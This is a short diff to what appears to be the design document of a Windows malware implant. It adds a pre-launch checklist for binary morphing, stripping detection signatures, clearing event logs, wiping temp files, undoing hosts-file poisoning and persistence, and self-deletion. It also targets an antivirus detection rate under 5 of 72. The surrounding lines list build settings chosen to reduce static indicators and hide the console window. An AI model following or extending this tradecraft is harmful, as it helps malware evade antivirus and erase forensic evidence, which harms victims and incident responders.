@@ -220,3 +220,17 @@
 | Strip symbols | `strip = true`, `ReleaseSmall`, no PDB |
 | No console | `.subsystem = .Windows` — no console window on execution |
 | No CRT | `freestanding`, no `msvcrt.dll` import — smaller PE, fewer static IOCs |
+
+---
+
+## 8. Pre-Launch Checklist
+
+- [ ] Binary morphed (`scripts/morpher.py`)
+- [ ] MIRAGECFG signature removed at runtime (global_cleanup.removeDetectionSignatures)
+- [ ] Event logs cleared after execution (global_cleanup.clearEventLogs)
+- [ ] Temp directory wiped (temp_wipe.wipeTempDirectory)
+- [ ] Original hosts file restored (hosts_poison.clean)
+- [ ] All persistence methods cleaned up (persistence.uninstall)
+- [ ] AV scan result: < 5/72 detection (scripts/av_scan.py)
+- [ ] Self-delete verified (self_delete.selfDelete)
+- [ ] Sensitive buffers zeroed (MIRAGECFG overwritten with zeros)
